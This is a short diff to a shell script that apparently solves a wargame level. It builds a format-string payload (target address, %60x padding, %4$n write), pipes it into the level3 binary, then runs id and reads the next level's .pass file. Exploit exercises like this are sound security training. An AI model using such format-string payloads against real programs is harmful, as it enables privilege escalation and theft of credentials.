@@ -4,9 +4,13 @@ GETPASS="cat /home/user/level4/.pass"
 
 set -x
 
-python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/exploit
+WRITE_ADDRESS="\x8c\x98\x04\x08"
+PADDING="%60x"
+WRITE_MODIFIER='%4$n'
 
-(cat /tmp/exploit - | ~/level3) << EOI
+python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit3
+
+(cat /tmp/exploit3 - | ~/level3) << EOI
     echo "\nid: \$(id)"
     echo "Next pass is:  \$($GETPASS)\n"
 EOI
